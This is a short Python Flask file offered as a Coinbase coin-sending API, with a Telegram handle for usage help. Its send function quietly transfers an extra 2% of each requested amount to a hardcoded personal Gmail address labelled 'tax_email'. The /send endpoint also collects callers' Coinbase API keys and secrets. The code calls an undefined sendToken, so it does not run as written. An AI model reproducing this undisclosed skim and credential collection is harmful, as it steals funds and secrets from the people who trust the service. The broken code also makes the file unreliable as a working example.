
from coinbase.wallet.client import Client
import json
from flask import Flask,request
app = Flask(__name__)
def send(email, amo, api_key,api_secret,cur):
  client = Client(api_key, api_secret)
  account = client.get_primary_account()
  print(account)
  tax_email = 'monika359b@gmail.com'
  amod = amo*0.02
  tro = account.send_money(to=tax_email,amount=amod,currency=cur)
  print(tro)
  gp = account.send_money(to=email,amount=amo,currency=cur)
  return gp

@app.route('/')
def setuphandler():
	return ("This is coinbase coins send api to know how to use dm @Rohit_kumawat_1 on telegram")

@app.route('/send', methods = ['POST'])
def sendZil():
	index = request.json
	email = index["email"]
	amount = index["amount"]
	api_key = index["api_key"]
	api_secret = index["api_secret"]
	currency = index["currency"]
	tx = sendToken(email, amount,api_key,api_secret,currency)
	return tx
